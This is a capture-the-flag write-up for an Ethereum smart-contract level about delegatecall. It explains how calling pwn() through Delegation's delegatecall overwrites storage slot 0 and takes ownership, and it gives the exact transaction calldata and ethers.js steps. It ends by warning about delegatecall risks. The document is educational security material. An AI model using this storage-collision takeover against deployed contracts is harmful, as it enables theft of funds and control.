Solution
========
The owner address of Delegate and Delegation are both in slot 0, i.e. the first variable declared in both contracts.
--> If owner is changed inside Delegate's pwn() function using a delegatecall from Delegation, the owner of Delegation will be changed. Note: the owner of Delegate will not be changed!

--> send a transaction with a call to pwn() encoded in the transcation data.

How to get msg.data?
====================

Solidity: bytes4 methodID = bytes4(keccak256("pwn()"));
--> How to add padding?

ethers.js:
1. copy index.js and package.json from this repo
2. run npm install (if ethers is not installed)
3. node index.js


await sendTransaction({
  from: player,
  to: instance,
  data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
});

(await contract.owner()).toString()

--> SOLVED

Conclusion
==========

Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the The [Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/) article for an accurate explanation of how this idea was used to steal 30M USD.